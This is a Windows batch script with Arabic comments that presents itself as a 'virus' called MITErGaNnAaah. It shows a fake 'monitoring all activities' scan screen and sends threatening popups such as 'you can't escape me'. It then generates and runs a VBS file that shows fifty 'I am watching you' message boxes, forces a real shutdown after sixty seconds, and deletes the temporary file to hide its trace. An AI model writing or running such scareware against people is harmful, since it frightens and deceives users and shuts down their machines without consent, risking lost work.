@echo off
:: تغيير عنوان النافذة لاسم الفيروس الخاص بك
title MITErGaNnAaah - SYSTEM OVERLOAD
color 0c

:: 1. رسالة التحدي الأولى عند الفتح مباشرة
msg * "لا تستطيع الهرب مني"

:: 2. إظهار اسم الفيروس لمدة دقيقة كاملة (60 ثانية)
echo ########################################################
echo.
echo           WARNING: MITErGaNnAaah SYSTEM ACTIVE
echo.
echo           [ STATUS: MONITORING ALL ACTIVITIES ]
echo.
echo ########################################################
echo.
echo Your system is being scanned... Please wait 60 seconds.
echo.
timeout /t 60

:: 3. رسالة تحذير ويندوز المخصصة
msg * "[an error has been DeTicteD]"

:: 4. سلسلة رسائل الانهيار والتهديد الغامضة
msg * "سوف اخذك معيييييييييييي"
msg * "(شوف اخذك#مع/)"
msg * "خوف اخذك_م/=)"
msg * "(="
msg * "(= "
msg * "(= "
msg * ")="
msg * "!="
msg * "]="

:: 5. إنشاء ملف الـ 50 رسالة "أنا أراقبك"
echo Set objShell = WScript.CreateObject("WScript.Shell") > alert.vbs
echo For i = 1 To 50 >> alert.vbs
echo     MsgBox "أنا أراقبك", 16+0, "MITErGaNnAaah" >> alert.vbs
echo Next >> alert.vbs

:: 6. تشغيل الرسائل المنبثقة الـ 50 المتتالية
start alert.vbs

:: 7. أمر إغلاق الجهاز النهائي (العد التنازلي الحقيقي)
shutdown -s -t 60 -c "MITErGaNnAaah: Final Countdown... Your time is up."

:: 8. تنظيف الملف المؤقت لعدم ترك أثر برمجي
timeout /t 2 >nul
del alert.vbs